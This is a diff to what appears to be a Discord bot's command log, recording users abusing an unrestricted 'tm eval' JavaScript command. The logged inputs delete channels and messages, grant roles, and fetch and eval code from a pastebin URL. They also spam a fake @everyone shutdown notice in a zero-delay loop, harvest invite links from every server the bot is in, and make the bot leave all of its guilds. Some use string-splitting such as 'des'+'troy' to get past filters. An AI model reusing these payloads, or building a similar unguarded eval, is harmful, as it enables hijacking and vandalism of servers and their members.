@@ -421,3 +421,216 @@ Tue Jun 07 2022 16:36:46 GMT+0000 (Coordinated Universal Time) bírb#9061 | TMod
 Tue Jun 07 2022 16:37:13 GMT+0000 (Coordinated Universal Time) bírb#9061 | TMod. Testing | 971406709807517746: tm eval module.require("fs").readFileSync("./index.js").toString() 
 Tue Jun 07 2022 16:37:28 GMT+0000 (Coordinated Universal Time) bírb#9061 | TMod. Testing | 971406709807517746: tm eval module["req"+"uire"]("fs").readFileSync("./index.js").toString() 
 Tue Jun 07 2022 16:40:30 GMT+0000 (Coordinated Universal Time) Natasquare#8297 | TMod. Testing | 971406709807517746: tm eval 
+Sat Jun 18 2022 01:49:56 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval resetBot() 
+Sat Jun 18 2022 01:50:49 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm hi 
+Sat Jun 18 2022 01:50:52 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval 
+Sat Jun 18 2022 01:54:24 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm messagedevs 
+Sat Jun 18 2022 01:55:43 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm messagedevs test 
+Sat Jun 18 2022 03:10:00 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm beg 
+Sat Jun 18 2022 11:29:37 GMT+0000 (Coordinated Universal Time) bye#6289 | TMod. Testing Official | 984458565160927312: tm hi 
+Sat Jun 18 2022 11:30:36 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm evail agjhgj 
+Sat Jun 18 2022 11:30:38 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval 
+Sat Jun 18 2022 11:30:59 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval 
+Sat Jun 18 2022 11:32:20 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval 
+Sat Jun 18 2022 11:34:08 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunenr.guilds.cache.get('984458565160927312').channels.fetch('987338160608538644').then(message => message.delete()); 
+Sat Jun 18 2022 11:34:19 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get('984458565160927312').channels.fetch('987338160608538644').then(message => message.delete()); 
+Sat Jun 18 2022 11:35:50 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval client.channels.cache.get('987338160608538644').then(message => message.delete()); 
+Sat Jun 18 2022 11:36:01 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644').then(message => message.delete()); 
+Sat Jun 18 2022 11:36:24 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm shop 
+Sat Jun 18 2022 11:36:26 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache 
+Sat Jun 18 2022 11:36:53 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644') 
+Sat Jun 18 2022 11:37:00 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644').delete() 
+Sat Jun 18 2022 11:37:18 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm ralsei 
+Sat Jun 18 2022 11:37:24 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm balls 
+Sat Jun 18 2022 11:37:33 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm gea 
+Sat Jun 18 2022 11:38:07 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm inventory 
+Sat Jun 18 2022 11:38:27 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm G 
+Sat Jun 18 2022 11:38:28 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm hi 
+Sat Jun 18 2022 11:38:30 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: Tm help 
+Sat Jun 18 2022 11:38:36 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm partner 
+Sat Jun 18 2022 11:38:46 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm unicode color red 
+Sat Jun 18 2022 11:39:05 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644') 
+Sat Jun 18 2022 11:39:16 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644').delete() 
+Sat Jun 18 2022 11:39:44 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644')["topic"] = "test" 
+Sat Jun 18 2022 11:39:57 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644') 
+Sat Jun 18 2022 11:40:11 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.channels.cache.get('987338160608538644')["name"] = "U GONE CRAP" 
+Sat Jun 18 2022 11:41:11 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+const category = await botRunner.channels.cache.get("984874761127624734");
+category.children.forEach(channel => channel.delete()) 
+Sat Jun 18 2022 11:41:21 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+const category = botRunner.channels.cache.get("984874761127624734");
+category.children.forEach(channel => channel.delete()) 
+Sat Jun 18 2022 11:41:34 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+const category = botRunner.channels.cache.get("984874761127624734");
+category.children.forEach(channel => channel) 
+Sat Jun 18 2022 11:43:01 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval
+const fetchedChannel = botRunner.channels.cache.get('987338160608538644').delete(); 
+Sat Jun 18 2022 11:43:10 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval 
+Sat Jun 18 2022 11:43:11 GMT+0000 (Coordinated Universal Time) 4TechGuns#0819 | yo bot ass | 987332865849171988: tm hi 
+Sat Jun 18 2022 11:43:16 GMT+0000 (Coordinated Universal Time) 4TechGuns#0819 | yo bot ass | 987332865849171988: tm hi 
+Sat Jun 18 2022 11:43:52 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.get("987351436784468032");
+botRunner.members.cache.get("424503404195348481").roles.add(role); 
+Sat Jun 18 2022 11:44:32 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.get("987351436784468032");
+botRunner.users.cache.get("424503404195348481").roles.add(role); 
+Sat Jun 18 2022 11:44:44 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.get("987351436784468032");
+botRunner.users.get("424503404195348481").roles.add(role); 
+Sat Jun 18 2022 11:45:14 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.get("987351436784468032");
+botRunner.users.cache.get("424503404195348481").roles.add(role); 
+Sat Jun 18 2022 11:45:20 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.get("987351436784468032"); 
+Sat Jun 18 2022 11:45:47 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles 
+Sat Jun 18 2022 11:45:51 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache 
+Sat Jun 18 2022 11:46:05 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+var role= botRunner.roles.cache.find 
+Sat Jun 18 2022 11:46:27 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+botRunner.roles 
+Sat Jun 18 2022 11:46:34 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner 
+Sat Jun 18 2022 11:46:35 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval botRunner.channels.cache.get('987338160608538644').delete(); 
+Sat Jun 18 2022 11:47:18 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval msg.guild.roles.cache.get("") 
+Sat Jun 18 2022 11:47:22 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval msg.guild.roles.cache.get 
+Sat Jun 18 2022 11:47:33 GMT+0000 (Coordinated Universal Time) bye#6289 | asdfasfdaf | 987680553476186132: tm eval msg.guild.roles.cache.get(); 
+Sat Jun 18 2022 11:48:11 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").roles.cache.get("984461388342775908") 
+Sat Jun 18 2022 11:48:14 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval msg.channel.send("test"); 
+Sat Jun 18 2022 11:48:28 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.users.cache.get("424503404195348481") 
+Sat Jun 18 2022 11:48:50 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.users.cache.get("424503404195348481").roles.add(botRunner.guilds.cache.get("984458565160927312").roles.cache.get("984461388342775908")) 
+Sat Jun 18 2022 11:49:00 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.users.cache.get("424503404195348481").roles 
+Sat Jun 18 2022 11:49:38 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").users.cache.get("424503404195348481") 
+Sat Jun 18 2022 11:49:45 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312") 
+Sat Jun 18 2022 11:50:32 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval https://pastebin.com/8BP4NDGg 
+Sat Jun 18 2022 11:50:36 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").roles.cache.get("984461388342775908") 
+Sat Jun 18 2022 11:50:37 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval 
+Sat Jun 18 2022 11:50:53 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.users.cache.get("424503404195348481") 
+Sat Jun 18 2022 11:51:19 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").members 
+Sat Jun 18 2022 11:51:49 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").members.cache.get("") 
+Sat Jun 18 2022 11:51:57 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").members.cache.get("424503404195348481") 
+Sat Jun 18 2022 11:52:04 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").members. 
+Sat Jun 18 2022 11:52:08 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm eval fetch("https://pastebin.com/8BP4NDGg ").then(c => { c.text().then(t => eval(t) } }) 
+Sat Jun 18 2022 11:52:11 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").members.get("424503404195348481") 
+Sat Jun 18 2022 11:52:41 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval msg.member.roles.add(botRunner.guilds.cache.get("984458565160927312").roles.cache.get("984461388342775908")) 
+Sat Jun 18 2022 11:53:29 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.create("hi") 
+Sat Jun 18 2022 11:54:11 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").send("hi") 
+Sat Jun 18 2022 11:54:55 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").messages.first() 
+Sat Jun 18 2022 11:54:59 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").messages. 
+Sat Jun 18 2022 11:55:04 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").messages 
+Sat Jun 18 2022 11:55:29 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").lastMessage 
+Sat Jun 18 2022 11:55:34 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").lastMessage.delete() 
+Sat Jun 18 2022 11:55:51 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").messages.forEach() 
+Sat Jun 18 2022 11:55:55 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").messages 
+Sat Jun 18 2022 11:56:43 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+const channel = botRunner.guilds.cache.get("984458565160927312").
+async () => {
+  let fetched;
+  do {
+    fetched = await channel.fetchMessages({limit: 100});
+    message.channel.bulkDelete(fetched);
+  }
+  while(fetched.size >= 2);
+} 
+Sat Jun 18 2022 11:57:03 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+const channel = botRunner.guilds.cache.get("984458565160927312")
+async () => {
+  let fetched;
+  do {
+    fetched = await channel.fetchMessages({limit: 100});
+    message.channel.bulkDelete(fetched);
+  }
+  while(fetched.size >= 2);
+} 
+Sat Jun 18 2022 11:57:59 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval //
+botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").bulkDelete(100) 
+Sat Jun 18 2022 11:59:42 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987346072408064060").send(`@everyone, Hello, i have bad news, due to how many times bot is getting hacked, we will sadly have to be shutting down TModeration
+here is our reasons
+1. too much spam
+2. everyone hate it
+3. many bug`) 
+Sat Jun 18 2022 12:00:00 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987346072408064060").send("@everyone, Hello, i have bad news, due to how many times bot is getting hacked, we will sadly have to be shutting down TModeration") 
+Sat Jun 18 2022 12:00:14 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").send("@everyone, Hello, i have bad news, due to how many times bot is getting hacked, we will sadly have to be shutting down TModeration") 
+Sat Jun 18 2022 12:00:34 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval setInterval(() => {botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987338160608538644").send("@everyone, Hello, i have bad news, due to how many times bot is getting hacked, we will sadly have to be shutting down TModeration")},0) 
+Sat Jun 18 2022 12:03:48 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval hiSat Jun 18 2022 13:14:25 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval botRunner["des" + "troy"]() 
+Sat Jun 18 2022 13:36:06 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm hi 
+Sat Jun 18 2022 13:46:45 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.messages.resolve("987714724986761216").react("✅") 
+Sat Jun 18 2022 13:46:57 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.messages.resolve("987714724986761216").react("✅") 
+Sat Jun 18 2022 13:48:13 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.messages.resolve("987714724986761216").react("✅") 
+Sat Jun 18 2022 13:50:01 GMT+0000 (Coordinated Universal Time) 4TechGuns#0819 | TMod. Testing Official | 984458565160927312: tm eval hi 
+Sat Jun 18 2022 13:50:53 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.messages.resolve("987714724986761216").react("✅") 
+Sat Jun 18 2022 13:53:42 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm ralsei 
+Sat Jun 18 2022 13:53:56 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm help 
+Sat Jun 18 2022 13:53:59 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm hi 
+Sat Jun 18 2022 13:54:03 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm Grease 
+Sat Jun 18 2022 13:54:07 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm null 
+Sat Jun 18 2022 13:54:11 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm null 3 
+Sat Jun 18 2022 13:54:18 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm null 
+Sat Jun 18 2022 13:54:27 GMT+0000 (Coordinated Universal Time) bye#6289 | yo bot ass | 987332865849171988: tm messagedevs u are an idiot 
+Sat Jun 18 2022 14:02:32 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm eval 
+Sat Jun 18 2022 14:02:53 GMT+0000 (Coordinated Universal Time) bye#6289 | Adam and crew | 987536268856557588: tm eval 
+Sat Jun 18 2022 14:08:23 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.send(Buffer.from("438326324252377088").toString("base64")) 
+Sat Jun 18 2022 14:12:04 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm analytics 
+Sat Jun 18 2022 14:13:02 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm analytics 
+Sat Jun 18 2022 14:13:53 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm analytics 
+Sat Jun 18 2022 14:18:07 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm key-reveal-.henry133 
+Sat Jun 18 2022 14:19:21 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm key-reveal-.henry133 
+Sat Jun 18 2022 14:21:24 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm key-reveal-.henry133 
+Sat Jun 18 2022 14:21:36 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm analytics 
+Sat Jun 18 2022 14:22:22 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.channel.invites 
+Sat Jun 18 2022 14:22:48 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.guild.invites 
+Sat Jun 18 2022 14:22:49 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval 
+Sat Jun 18 2022 14:23:11 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.guild.invites.create(c.id) 
+Sat Jun 18 2022 14:23:21 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval 
+Sat Jun 18 2022 14:23:52 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.get("984458565160927312").leave() 
+Sat Jun 18 2022 14:24:37 GMT+0000 (Coordinated Universal Time) karbis#5320 | asdfasfdaf | 987680553476186132: tm eval botRunner.guilds.cache.forEach(guild => {guild.leave()}) 
+Sat Jun 18 2022 14:26:01 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => guild.channels.cache.forEach(c => guild.channel.invites.create(c.id).then(m => msg.channel.send(m.code))) 
+Sat Jun 18 2022 14:26:07 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => guild.channels.cache.forEach(c => guild.channel.invites.create(c.id).then(m => msg.channel.send(m.code)))) 
+Sat Jun 18 2022 14:26:30 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => guild.channels.cache.forEach(c => guild.invites.create(c.id).then(m => msg.channel.send(m.code)))) 
+Sat Jun 18 2022 14:27:34 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => {if(guild.id != msg.guild.id) { guild.channels.cache.forEach(c => guild.invites.create(c.id).then(m => msg.channel.send(m.url.split('').join("\u200b")))} } 
+Sat Jun 18 2022 14:27:39 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => {if(guild.id != msg.guild.id) { guild.channels.cache.forEach(c => guild.invites.create(c.id).then(m => msg.channel.send(m.url.split('').join("\u200b")))} }) 
+Sat Jun 18 2022 14:28:18 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => {if(guild.id != msg.guild.id) { guild.channels.cache.forEach(c => guild.invites.create(c.id).then(m => msg.channel.send(m.url.split('').join("\u200b"))) } }) 
+Sat Jun 18 2022 14:28:25 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval msg.client.guilds.cache.forEach(guild => {if(guild.id != msg.guild.id) { guild.channels.cache.forEach(c => guild.invites.create(c.id).then(m => msg.channel.send(m.url.split('').join("\u200b")))) } }) 
+Sat Jun 18 2022 14:30:45 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval 
+Sat Jun 18 2022 14:30:54 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm statictis 
+Sat Jun 18 2022 14:30:58 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm statistics 
+Sat Jun 18 2022 14:30:58 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm hi 
+Sat Jun 18 2022 14:31:02 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm stats 
+Sat Jun 18 2022 14:31:05 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm statistics 
+Sat Jun 18 2022 14:31:07 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm hel 
+Sat Jun 18 2022 14:31:09 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm help 
+Sat Jun 18 2022 14:31:59 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987346072408064060").send("test") 
+Sat Jun 18 2022 14:32:09 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm spoilmytext undertale porn 
+Sat Jun 18 2022 14:32:18 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm null 
+Sat Jun 18 2022 14:32:31 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm ping 
+Sat Jun 18 2022 14:32:38 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm ping 
+Sat Jun 18 2022 14:32:41 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm statictis 
+Sat Jun 18 2022 14:32:52 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm statistics 
+Sat Jun 18 2022 14:32:57 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval botRunner.guilds.cache.get("984458565160927312").channels.cache.get("987346072408064060") 
+Sat Jun 18 2022 14:33:02 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm hi 
+Sat Jun 18 2022 14:33:27 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval tm eval botRunner.guilds.cache.get("984458565160927312").members.cache.get("937190474299633734") 
+Sat Jun 18 2022 14:33:34 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval tm eval botRunner.guilds.cache.get("984458565160927312") 
+Sat Jun 18 2022 14:33:41 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm evalbotRunner.guilds.cache.get("984458565160927312").members.cache.get("937190474299633734") 
+Sat Jun 18 2022 14:33:45 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval botRunner.guilds.cache.get("984458565160927312").members.cache.get("937190474299633734") 
+Sat Jun 18 2022 14:34:05 GMT+0000 (Coordinated Universal Time) Henry133#2436 | TMod. Testing Official | 984458565160927312: tm eval botRunner._events.messageCreate 
+Sat Jun 18 2022 14:34:52 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval //
+client.on('message', message => {
+  if (message.content === "tm grease") {
+   message.reply("y u so grease")
+  }
+}); 
+Sat Jun 18 2022 14:35:03 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval //
+botRunner.on('message', message => {
+  if (message.content === "tm grease") {
+   message.reply("y u so grease")
+  }
+}); 
+Sat Jun 18 2022 14:35:06 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm grease 
+Sat Jun 18 2022 14:36:47 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm ass 
+Sat Jun 18 2022 14:36:53 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm @everyone 
+Sat Jun 18 2022 14:37:02 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm grease 
+Sat Jun 18 2022 14:37:02 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm messagedevs 3130194 
+Sat Jun 18 2022 14:37:20 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval 
+Sat Jun 18 2022 14:37:31 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval balls 
